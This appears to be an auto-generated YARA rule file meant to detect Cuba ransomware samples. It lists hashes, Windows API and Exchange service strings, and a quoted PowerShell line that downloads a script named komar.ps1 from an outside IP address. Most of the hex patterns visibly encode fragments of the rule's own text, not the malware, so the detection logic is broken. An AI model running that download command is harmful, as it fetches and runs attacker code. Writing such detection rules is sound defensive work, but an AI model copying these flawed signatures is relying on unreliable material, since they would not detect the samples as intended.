
/*
   YARA Rule Set
   Author: resteex
   Identifier: vx_underground2_CubaRansomware 
   /
/* Rule Set ----------------------------------------------------------------- */

rule resteex_vx_underground2_CubaRansomware {
	meta: 
		 description= "vx_underground2_CubaRansomware Group" 
		 author = "Resteex Generator" 
		 date = "2022-01-20_21-54-22" 
		 license = "https://github.com/resteex0/yarex"
		 hash1= "3fe1a3aaca999a5db936843c9bdfea14"
		 hash2= "4c32ef0836a0af7025e97c6253054bca"
		 hash3= "72a60d799ae9e4f0a3443a2f96fb4896"
		 hash4= "75b55bb34dac9d02740b9ad6b6820360"
		 hash5= "7b6f996cc1ad4b5e131e7bf9b1c33253"
		 hash6= "99c7cad7032ec5add3a21582a64bb149"
		 hash7= "ba83831700a73661f99d38d7505b5646"
		 hash8= "c0451fd7921342e0d2fbf682091d4280"
		 hash9= "d907be57b5ef2af8a8b45d5f87aa4773"
		 hash10= "ee2f71faced3f5b5b202c7576f0f52b9"

	strings:

	
 		 $s1= "Aapi-ms-win-appmodel-runtime-l1-1-1" fullword wide
		 $s2= "Aapi-ms-win-core-fibers-l1-1-1" fullword wide
		 $s3= "api-ms-win-core-datetime-l1-1-1" fullword wide
		 $s4= "api-ms-win-core-fibers-l1-1-1" fullword wide
		 $s5= "api-ms-win-core-file-l2-1-1" fullword wide
		 $s6= "api-ms-win-core-localization-l1-2-1" fullword wide
		 $s7= "api-ms-win-core-localization-obsolete-l1-2-0" fullword wide
		 $s8= "api-ms-win-core-processthreads-l1-1-2" fullword wide
		 $s9= "api-ms-win-core-string-l1-1-0" fullword wide
		 $s10= "api-ms-win-core-synch-l1-2-0" fullword wide
		 $s11= "api-ms-win-core-sysinfo-l1-2-1" fullword wide
		 $s12= "api-ms-win-core-winrt-l1-1-0" fullword wide
		 $s13= "api-ms-win-core-xstate-l2-1-0" fullword wide
		 $s14= "api-ms-win-rtcore-ntuser-window-l1-1-0" fullword wide
		 $s15= "api-ms-win-security-systemfunctions-l1-1-0" fullword wide
		 $s16= "Bapi-ms-win-core-synch-l1-2-0.dll" fullword wide
		 $s17= "ext-ms-win-kernel32-package-current-l1-1-0" fullword wide
		 $s18= "ext-ms-win-ntuser-dialogbox-l1-1-0" fullword wide
		 $s19= "ext-ms-win-ntuser-windowstation-l1-1-0" fullword wide
		 $s20= "Microsoft.Exchange.Store.Worker.exe" fullword wide
		 $s21= "MSExchangeFrontEndTransport" fullword wide
		 $s22= "MSExchangeMailboxAssistants" fullword wide
		 $s23= "MSExchangeMailboxReplication" fullword wide
		 $s24= "MSExchangeNotificationsBroker" fullword wide
		 $s25= "MSExchangeTransportLogSearch" fullword wide
		 $s26= "_SA_{262E99C9-6160-4871-ACEC-4E61736B6F21}" fullword wide
		 $s27= "SeIncreaseWorkingSetPrivilege" fullword wide
		 $s28= "SoftwareMicrosoftWindows NTCurrentVersionServerServerLevels" fullword wide
		 $s29= "StartServiceCtrlDispatcher failed." fullword wide
		 $s30= "U_i=V`j>Wak?Xbl@YcmAZdnB[eoCfpD]gq" fullword wide
		 $a1= "$client.downloadfile('http://45.32.229.66/komar.ps1',$path);" fullword ascii
		 $a2= ">http://www.microsoft.com/pki/certs/MicCodSigPCA_08-31-2010.crt0" fullword ascii
		 $a3= ">http://www.microsoft.com/pki/certs/MicRooCerAut_2010-06-23.crt0" fullword ascii
		 $a4= "http://www.microsoft.com/pki/certs/MicrosoftTimeStampPCA.crt0" fullword ascii
		 $a5= ">http://www.microsoft.com/pki/certs/MicTimStaPCA_2010-07-01.crt0" fullword ascii

		 $hex1= {2461313d202224636c}
		 $hex2= {2461323d20223e6874}
		 $hex3= {2461333d20223e6874}
		 $hex4= {2461343d2022687474}
		 $hex5= {2461353d20223e6874}
		 $hex6= {247331303d20226170}
		 $hex7= {247331313d20226170}
		 $hex8= {247331323d20226170}
		 $hex9= {247331333d20226170}
		 $hex10= {247331343d20226170}
		 $hex11= {247331353d20226170}
		 $hex12= {247331363d20224261}
		 $hex13= {247331373d20226578}
		 $hex14= {247331383d20226578}
		 $hex15= {247331393d20226578}
		 $hex16= {2473313d2022416170}
		 $hex17= {247332303d20224d69}
		 $hex18= {247332313d20224d53}
		 $hex19= {247332323d20224d53}
		 $hex20= {247332333d20224d53}
		 $hex21= {247332343d20224d53}
		 $hex22= {247332353d20224d53}
		 $hex23= {247332363d20225f53}
		 $hex24= {247332373d20225365}
		 $hex25= {247332383d2022536f}
		 $hex26= {247332393d20225374}
		 $hex27= {2473323d2022416170}
		 $hex28= {247333303d2022555f}
		 $hex29= {2473333d2022617069}
		 $hex30= {2473343d2022617069}
		 $hex31= {2473353d2022617069}
		 $hex32= {2473363d2022617069}
		 $hex33= {2473373d2022617069}
		 $hex34= {2473383d2022617069}
		 $hex35= {2473393d2022617069}

	condition:
		23 of them
}
